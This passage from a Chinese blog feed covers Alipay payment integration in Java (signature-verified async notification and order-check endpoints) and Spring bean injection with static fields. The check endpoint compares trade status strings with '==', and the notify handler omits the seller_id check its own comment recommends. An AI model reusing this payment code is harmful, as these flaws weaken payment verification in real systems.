e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> AjaxResult.error(<span class="string">"加密失败！"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>入参 orderSn 是订单编号，这里需要在项目后台数据库保存支付宝支付订单，使用 AlipaymentOrder 这个实体类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AlipaymentOrder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 订单ID</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> orderId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 订单号</span></span><br><span class="line">    <span class="keyword">private</span> String outTradeNo;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 金额</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> amount;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 交易状态</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> tradeStatus;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通知时间</span></span><br><span class="line">    <span class="keyword">private</span> String notifyTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 订单生成时间</span></span><br><span class="line">    <span class="keyword">private</span> String createTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 付款时间</span></span><br><span class="line">    <span class="keyword">private</span> String payTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 退款时间</span></span><br><span class="line">    <span class="keyword">private</span> String refundTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 订单结束时间</span></span><br><span class="line">    <span class="keyword">private</span> String closeTime;</span><br><span class="line">  </span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是 response.getBody() 就是加密后的订单字符串，可以直接返回给 App 端进行使用。</p><h3 id="接口-2：支付宝服务端异步通知"><a href="#接口-2：支付宝服务端异步通知" class="headerlink" title="接口 2：支付宝服务端异步通知"></a>接口 2：支付宝服务端异步通知</h3><p><strong>功能</strong></p><ul><li><p>通过异步通知更新支付宝订单信息。</p></li><li><p>防止订单丢失，即页面跳转同步通知没有处理订单更新，它则去处理。</p></li></ul><p><strong>注意</strong></p><ul><li>只有在支付宝的交易管理中存在该笔交易，且发生了交易状态的改变，支付宝才会通过该方式发起服务器通知。</li><li>第一次交易状态改变（即时到账中此时交易状态是交易完成）时，不仅会返回同步处理结果，而且服务器异步通知页面也会收到支付宝发来的处理结果通知。</li></ul><p><strong>代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(value = <span class="string">"/asyn"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getAsynResult</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> AlipayApiException </span>&#123;</span><br><span class="line">  <span class="comment">//获取支付宝POST过来反馈信息</span></span><br><span class="line">  Map&lt;String,String&gt; params = <span class="keyword">new</span> HashMap&lt;String,String&gt;();</span><br><span class="line">  Map requestParams = request.getParameterMap();</span><br><span class="line">  <span class="keyword">for</span> (Iterator iter = requestParams.keySet().iterator(); iter.hasNext();) &#123;</span><br><span class="line">    String name = (String) iter.next();</span><br><span class="line">    String[] values = (String[]) requestParams.get(name);</span><br><span class="line">    String valueStr = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; values.length; i++) &#123;</span><br><span class="line">      valueStr = (i == values.length - <span class="number">1</span>) ? valueStr + values[i]</span><br><span class="line">        : valueStr + values[i] + <span class="string">","</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//乱码解决，这段代码在出现乱码时使用。</span></span><br><span class="line">    <span class="comment">//valueStr = new String(valueStr.getBytes("ISO-8859-1"), "utf-8");</span></span><br><span class="line">    params.put(name, valueStr);</span><br><span class="line">    logger.info(name+<span class="string">" "</span>+valueStr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//切记alipaypublickey是支付宝的公钥，请去open.alipay.com对应应用下查看。</span></span><br><span class="line">  <span class="comment">//boolean AlipaySignature.rsaCertCheckV1(Map&lt;String, String&gt; params, String publicKeyCertPath, String charset,String signType)</span></span><br><span class="line">  <span class="comment">//调用SDK验证签名</span></span><br><span class="line">  <span class="keyword">boolean</span> flag = AlipaySignature.rsaCertCheckV1(params, alipayPublicCertPath, <span class="string">"UTF-8"</span>,<span class="string">"RSA2"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">    <span class="comment">//获取商户之前传给支付宝的订单号（商户系统的唯一订单号）</span></span><br><span class="line">    String outTradeNo = params.get(<span class="string">"out_trade_no"</span>);</span><br><span class="line">    <span class="comment">//订单金额:本次交易支付的订单金额，单位为人民币（元）</span></span><br><span class="line">    String totalAmount=params.get(<span class="string">"total_amount"</span>);</span><br><span class="line">    <span class="comment">//卖家支付宝用户号</span></span><br><span class="line">    String sellerId=params.get(<span class="string">"seller_id"</span>);</span><br><span class="line">    <span class="comment">//支付宝分配给开发者的应用Id</span></span><br><span class="line">    String appId=params.get(<span class="string">"app_id"</span>);</span><br><span class="line">    <span class="comment">//获取交易状态</span></span><br><span class="line">    String tradeStatus = params.get(<span class="string">"trade_status"</span>);</span><br><span class="line">    <span class="comment">//通知时间:yyyy-MM-dd HH:mm:ss</span></span><br><span class="line">    String notifyTime=params.get(<span class="string">"notify_time"</span>);</span><br><span class="line">    <span class="comment">//交易创建时间:yyyy-MM-dd HH:mm:ss</span></span><br><span class="line">    String gmtCreate=params.get(<span class="string">"gmt_create"</span>);</span><br><span class="line">    <span class="comment">//交易付款时间</span></span><br><span class="line">    String gmtPayment=params.get(<span class="string">"gmt_payment"</span>);</span><br><span class="line">    <span class="comment">//交易退款时间</span></span><br><span class="line">    String gmtRefund=params.get(<span class="string">"gmt_refund"</span>);</span><br><span class="line">    <span class="comment">//交易结束时间</span></span><br><span class="line">    String gmtClose=params.get(<span class="string">"gmt_close"</span>);</span><br><span class="line"></span><br><span class="line">    AlipaymentOrder alipaymentOrder = alipaymentOrderService.selectAlipaymentOrder(outTradeNo);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//支付宝官方建议校验的值（out_trade_no、total_amount、sellerId、app_id）</span></span><br><span class="line">    <span class="keyword">if</span> (alipaymentOrder != <span class="keyword">null</span> &amp;&amp; totalAmount.equals(String.valueOf(alipaymentOrder.getAmount())) &amp;&amp; app_id.equals(appId)) &#123;</span><br><span class="line">      <span class="comment">// 更新时间相关的值</span></span><br><span class="line">      alipaymentOrder.setNotifyTime(notifyTime);</span><br><span class="line">      alipaymentOrder.setCreateTime(gmtCreate);</span><br><span class="line">      alipaymentOrder.setPayTime(gmtPayment);</span><br><span class="line">      alipaymentOrder.setRefundTime(gmtRefund);</span><br><span class="line">      alipaymentOrder.setCloseTime(gmtClose);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 判断交易结果</span></span><br><span class="line">      <span class="keyword">switch</span> (tradeStatus)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"TRADE_FINISHED"</span>: <span class="comment">// 交易结束并不可退款</span></span><br><span class="line">          alipaymentOrder.setTradeStatus(<span class="number">3</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"TRADE_SUCCESS"</span>: <span class="comment">// 交易支付成功</span></span><br><span class="line">          alipaymentOrder.setTradeStatus(<span class="number">2</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"TRADE_CLOSED"</span>: <span class="comment">// 未付款交易超时关闭或支付完成后全额退款</span></span><br><span class="line">          alipaymentOrder.setTradeStatus(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"WAIT_BUYER_PAY"</span>: <span class="comment">// 交易创建并等待买家付款</span></span><br><span class="line">          alipaymentOrder.setTradeStatus(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      alipaymentOrderService.updateAlipaymentOrder(alipaymentOrder);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (tradeStatus.equals(<span class="string">"TRADE_SUCCESS"</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//                return AjaxResult.success("验证签名成功但订单未成功支付");</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//            return AjaxResult.error("支付宝官方建议校验的值（out_trade_no、total_amount、sellerId、app_id）不一致！");</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//        return AjaxResult.error("验证签名失败！");</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">"fail"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意按照支付宝要求，返回的必须是字符串 “success” 或 “fail”。</p><h3 id="接口-3：最终付款校验"><a href="#接口-3：最终付款校验" class="headerlink" title="接口 3：最终付款校验"></a>接口 3：最终付款校验</h3><p><strong>功能</strong></p><p>最终支付结果必须通过这个接口进行校验。</p><p><strong>代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(value = <span class="string">"/check"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> AjaxResult <span class="title">check</span><span class="params">(@RequestParam String outTradeNo)</span> <span class="keyword">throws</span> AlipayApiException, ParseException </span>&#123;</span><br><span class="line">    <span class="comment">//构造client</span></span><br><span class="line">    CertAlipayRequest certAlipayRequest = <span class="keyword">new</span> CertAlipayRequest();</span><br><span class="line">    <span class="comment">//设置网关地址</span></span><br><span class="line">    certAlipayRequest.setServerUrl(<span class="string">"https://openapi.alipay.com/gateway.do"</span>);</span><br><span class="line">    <span class="comment">//设置应用Id</span></span><br><span class="line">    certAlipayRequest.setAppId(app_id);</span><br><span class="line">    <span class="comment">//设置应用私钥</span></span><br><span class="line">    certAlipayRequest.setPrivateKey(privateKey);</span><br><span class="line">    <span class="comment">//设置请求格式，固定值json</span></span><br><span class="line">    certAlipayRequest.setFormat(<span class="string">"json"</span>);</span><br><span class="line">    <span class="comment">//设置字符集</span></span><br><span class="line">    certAlipayRequest.setCharset(<span class="string">"UTF-8"</span>);</span><br><span class="line">    <span class="comment">//设置签名类型</span></span><br><span class="line">    certAlipayRequest.setSignType(<span class="string">"RSA2"</span>);</span><br><span class="line">    <span class="comment">//设置应用公钥证书路径</span></span><br><span class="line">    certAlipayRequest.setCertPath(certPath);</span><br><span class="line">    <span class="comment">//设置支付宝公钥证书路径</span></span><br><span class="line">    certAlipayRequest.setAlipayPublicCertPath(alipayPublicCertPath);</span><br><span class="line">    <span class="comment">//设置支付宝根证书路径</span></span><br><span class="line">    certAlipayRequest.setRootCertPath(rootCertPath);</span><br><span class="line">    <span class="comment">//构造client</span></span><br><span class="line">    AlipayClient alipayClient = <span class="keyword">new</span> DefaultAlipayClient(certAlipayRequest);</span><br><span class="line"></span><br><span class="line">    AlipayTradeQueryRequest alipayTradeQueryRequest = <span class="keyword">new</span> AlipayTradeQueryRequest();</span><br><span class="line">    alipayTradeQueryRequest.setBizContent(<span class="string">"&#123;"</span> +</span><br><span class="line">            <span class="string">"\"out_trade_no\":\""</span>+outTradeNo+<span class="string">"\""</span> +</span><br><span class="line">            <span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line">    AlipayTradeQueryResponse alipayTradeQueryResponse = alipayClient.certificateExecute(alipayTradeQueryRequest);</span><br><span class="line">    <span class="keyword">if</span>(alipayTradeQueryResponse.isSuccess())&#123;</span><br><span class="line">        AlipaymentOrder alipaymentOrder=alipaymentOrderService.selectAlipaymentOrder(outTradeNo);</span><br><span class="line">        EOrder eOrder=eOrderService.selectEOrderByOrderSn(outTradeNo);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//修改数据库支付宝订单表</span></span><br><span class="line">        alipaymentOrder.setAmount(Double.parseDouble(alipayTradeQueryResponse.getTotalAmount()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断交易结果</span></span><br><span class="line">        <span class="keyword">switch</span> (alipayTradeQueryResponse.getTradeStatus())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"TRADE_FINISHED"</span>: <span class="comment">// 交易结束并不可退款</span></span><br><span class="line">                alipaymentOrder.setTradeStatus(<span class="number">3</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"TRADE_SUCCESS"</span>: <span class="comment">// 交易支付成功</span></span><br><span class="line">                alipaymentOrder.setTradeStatus(<span class="number">2</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"TRADE_CLOSED"</span>: <span class="comment">// 未付款交易超时关闭或支付完成后全额退款</span></span><br><span class="line">                alipaymentOrder.setTradeStatus(<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"WAIT_BUYER_PAY"</span>: <span class="comment">// 交易创建并等待买家付款</span></span><br><span class="line">                alipaymentOrder.setTradeStatus(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        alipaymentOrderService.updateAlipaymentOrder(alipaymentOrder);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果支付成功，更新订单</span></span><br><span class="line">        <span class="keyword">if</span>(alipayTradeQueryResponse.getTradeStatus()==<span class="string">"TRADE_SUCCESS"</span>)&#123;</span><br><span class="line">            eOrder.setOrderStatus(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            String payTime=alipaymentOrder.getPayTime();</span><br><span class="line">            SimpleDateFormat simpleDateFormat = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>);</span><br><span class="line">            Date date=simpleDateFormat.parse(payTime);</span><br><span class="line">            eOrder.setPayTime(date);</span><br><span class="line"></span><br><span class="line">            eOrderMapper.updateEOrder(eOrder);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 保险订单</span></span><br><span class="line">            <span class="keyword">if</span> (eOrder.getOrderType() == <span class="number">1</span>) &#123;</span><br><span class="line">                EInsuranceOrder eInsuranceOrder=eInsuranceOrderMapper.selectEInsuranceOrderByOrderSn(outTradeNo);</span><br><span class="line">                eInsuranceOrder.setOrderStatus(<span class="number">1</span>);</span><br><span class="line">                eInsuranceOrder.setPayTime(date);</span><br><span class="line"></span><br><span class="line">                eInsuranceOrderMapper.updateEInsuranceOrder(eInsuranceOrder);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> AjaxResult.success(alipaymentOrder);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> AjaxResult.error(<span class="string">"调用支付宝查询接口失败！"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个接口可以加上支付成功后的订单逻辑。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这类通过第三方接口进行开发的工作，基本流程也就是上述这样，主要问题还是出在官方文档与实际操作的不符，这就需要 1.仔细阅读官方文档和理解示例代码 2.多打断点调试和看日志的输出情况。</p><p>比较重要的点是要和自己项目的业务逻辑结合，知道该把自己的代码安插在哪个位置。</p><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p><a href="https://blog.csdn.net/Ouyzc/article/details/79551714" target="_blank" rel="noopener">https://blog.csdn.net/Ouyzc/article/details/79551714</a></p>]]></content>
        <author>
            <name><![CDATA[风的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2020/09/using-beancount/</id>
        <title><![CDATA[开始使用 Beancount]]></title>
        <updated>2020-09-06T02:39:50+08:00</updated>
        <link href="https://blog.stdioa.com/2020/09/using-beancount/"/>
        <content type="text/html" src="https://blog.stdioa.com/2020/09/using-beancount/"><![CDATA[<p>使用 Beancount 记账已经有将近两个月了，简单写一写我都做了什么。</p>]]></content>
        <author>
            <name><![CDATA[Stdio’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://www.windboy.top/2020/07/15/blog10/</id>
        <title><![CDATA[Spring bean 的声明和注入]]></title>
        <updated>2020-08-25T07:09:07+08:00</updated>
        <link href="http://www.windboy.top/2020/07/15/blog10/"/>
        <content type="text/html" src="http://www.windboy.top/2020/07/15/blog10/"><![CDATA[<p>Spring bean 就是可重用组件，是 Spring 的基础。</p><p>通过 @Component 注解将一个类声明为 bean，交给 Spring 管理，并在需要的时候注入获取实例。这就是 Spring 重要的 IOC 功能。</p><p>今天研究的问题出现在<strong><u>注入</u></strong>这一步：在对一个工具类注入 RedisCache（封装了 RedisTemplate 的工具类），由于工具类使用了静态方法，导致无法获取到注入的 RedisCache。</p><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><p>首先来认识一下 static 可以作用的对象：</p><h4 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h4><p>又称为类变量，也就是说这个变量属于类的，类所有的实例都共享静态变量，可以直接通过类名来访问它。静态变量在内存中只存在一份。当类被 Java 虚拟机加载的时候，会对 static 变量进行初始化。静态变量存放在 Java 内存区域的方法区。而实例变量每创建一个实例就会产生一个，它与该实例同生共死。</p><h4 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h4><p>在类加载的时候就存在了，它不依赖于任何实例。所以静态方法必须有实现，也就是说它不能是抽象方法。只能访问所属类的静态字段和静态方法（初始化顺序），方法中不能有 this 和 super 关键字（静态不需要对象）。调用静态方法可以无需创建对象（如果使用对象.静态方法会在编译后翻译为类.静态方法）。如果方法执行的操作不依赖于其类的各个变量和方法，设置为静态使程序的占用空间更小。</p><h4 id="静态语句块"><a href="#静态语句块" class="headerlink" title="静态语句块"></a>静态语句块</h4><p>静态代码块定义在类中方法外，静态代码块在非静态代码块之前执行。该类不管创建多少对象，在类初始化时运行一次。</p><h4 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h4><p>非静态内部类在编译完成之后会隐含地保存着一个引用，该引用是指向创建它的外围类，但是静态内部类却没有。非静态内部类依赖于外部类的实例，也就是说需要先创建外部类实例，才能用这个实例去创建非静态内部类。而静态内部类不需要。静态内部类不能访问外部类的非静态的变量和方法。</p><h4 id="静态导包"><a href="#静态导包" class="headerlink" title="静态导包"></a>静态导包</h4><p>JDK1.5</p><p>我们这里使用的是<u><strong>静态方法</strong></u>，属于类，而不属于某个实例，调用静态方法时不会创建对象。</p><p>静态方法还提到了初始化顺序：</p><h4 id="初始化顺序"><a href="#初始化顺序" class="headerlink" title="初始化顺序"></a>初始化顺序</h4><p>静态变量和静态语句块 -&gt; 实例变量和普通语句块 -&gt; 构造函数。静态变量和静态语句块的初始化顺序取决于它们在代码中的顺序。</p><p><strong>存在继承时的初始化顺序</strong></p><ol><li><p>父类（静态变量、静态语句块）</p></li><li><p>子类（静态变量、静态语句块）</p></li><li><p>父类（实例变量、普通语句块）</p></li><li><p>父类（构造函数）</p></li><li><p>子类（实例变量、普通语句块）</p></li><li><p>子类（构造函数）</p></li></ol><h3 id="bean-的声明"><a href="#bean-的声明" class="headerlink" title="bean 的声明"></a>bean 的声明</h3><p>共有四种方式将将一个<u><strong>类</strong></u>声明为 bean 的注解：</p><h4 id="Component"><a href="#Component" class="headerlink" title="@Component"></a>@Component</h4><p>通用的注解，可标注任意类为 Spring 组件。如果一个 bean 不知道属于哪个层，可以使用 @Component 注解标注。创建对象，把当前对象存入 Spring 容器中，相当于 XML 的 &lt; bean&gt;。</p><h4 id="Repository"><a href="#Repository" class="headerlink" title="@Repository"></a>@Repository</h4><p>对应持久层，主要用于数据库相关操作。</p><h4 id="Service"><a href="#Service" class="headerlink" title="@Service"></a>@Service</h4><p>对应服务层，主要涉及一些复杂的逻辑。</p><h4 id="Controller"><a href="#Controller" class="headerlink" title="@Controller"></a>@Controller</h4><p>对应控制层，主要用户接受用户请求并返回数据给前端页面。</p><p>@Bean 注解作用于<u><strong>方法</strong></u>，对比一下 @Component ：</p><h4 id="Component-和-Bean-的区别"><a href="#Component-和-Bean-的区别" class="headerlink" title="@Component 和 @Bean 的区别"></a>@Component 和 @Bean 的区别</h4><p>@Component 注解作用于类，而 @Bean 注解作用于方法。</p><p>@Component 通常是通过类路径扫描来自动侦测以及自动装配到 Spring 容器中，@Bean 注解通常是在标有该注解的方法中定义产生这个 bean。</p><p>@Bean 注解比 Component 注解的自定义性更强，而且很多地方我们只能通过 @Bean 注解来注册 bean。比如当我们引用第三方库中的类需要装配到 Spring 容器时，则只能通过 @Bean 来实现。</p><h3 id="bean-的注入"><a href="#bean-的注入" class="headerlink" title="bean 的注入"></a>bean 的注入</h3><p>@Autowired 可以实现自动装配，对象无需自己查找或创建与其关联的其他对象，由容器负责把需要相互协作的对象引用赋予各个对象。</p><h4 id="容器中查询对应类型的-bean"><a href="#容器中查询对应类型的-bean" class="headerlink" title="容器中查询对应类型的 bean"></a>容器中查询对应类型的 bean</h4><ol><li><p>如果查询结果刚好为一个，就将该 bean 装配给 @Autowired 指定的数据。</p></li><li><p>如果查询的结果不止一个，那么 @Autowired 会根据名称来查找。</p></li><li><p>如果上述查找的结果为空，那么会抛出异常。解决方法：使用 required=false。</p></li></ol><p>@Resource、@Inject、@Qualifier 和 @Value 也可以实现同样的装配效果。</p><h4 id="Autowired-和-Resource-之间的区别"><a href="#Autowired-和-Resource-之间的区别" class="headerlink" title="@Autowired 和 @Resource 之间的区别"></a>@Autowired 和 @Resource 之间的区别</h4><ul><li><p>@Autowired 默认是按照类型装配注入的。</p></li><li><p>@Resource 默认是按照名称来装配注入的，只有当找不到与名称匹配的 bean 才会按照类型来装配注入。</p></li></ul><h4 id="Qualifier"><a href="#Qualifier" class="headerlink" title="@Qualifier"></a>@Qualifier</h4><p>在按照类注入的基础上再根据名称注入。给类注入时不能单独使用，需要配合 @Autowired。给方法和变量注入时可以单独使用。</p><h4 id="Value"><a href="#Value" class="headerlink" title="@Value"></a>@Value</h4><p>基本类型和 String 无法用 @Autowired、@Resource 和 @Qualifier 实现，需要使用 @Value。可以配合 Spring 的 EL 表达式 SpEL。</p><h3 id="问题的分析和解决方案"><a href="#问题的分析和解决方案" class="headerlink" title="问题的分析和解决方案"></a>问题的分析和解决方案</h3><p>了解了 static、bean 的声明和注入后，来看一下出问题的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> RedisCache redisCache;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sendSms</span><span class="params">(String[] phoneNumbers)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    redisCache.setCacheObject(key,code);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原来为了 TxsmsUtils.sendSms() 方便而将这个方法设置为 static，在方法内使用 redisCache 时需要 redisCache 也是静态的。</p><p>然而像上面分析的，静态变量属于类，而不属于某个实例，不会由 Spring 注入并创建对象。因此 sendSms() 这个方法中是获取不到 redisCache 对象的，因此出错。</p><p>解决：将 sendSms() 和 redisCache 设置为非静态，即去除 static。</p><p>另外，对于工具类，如果需要使用其他组件，需要将工具类也声明为 Spring bean，交给 Spring 来控制，这样才能获取到组件的实例。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>静态方法中无法进行获取到 Spring bean 的实例，看似直接明了的结论，若不是像我一样在实际开发过程中遇到过 bug，并从头到尾排查一边，真的得很难有完整的理解。</p><p>读万卷书，行万里路。要在懂得理论知识的前提下，积极实践，总结错误。我的这条路才刚刚开始。</p>]]></content>
        <author>
            <name><![CDATA[风的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://www.windboy.top/2020/06/01/blog9/</id>
        <title><![CDATA[MySQL & Redis 技术分享-下]]></title>
        <updated>2020-08-25T07:09:01+08:00</updated>
        <link href="http://www.windboy.top/2020/06/01/blog9/"/>
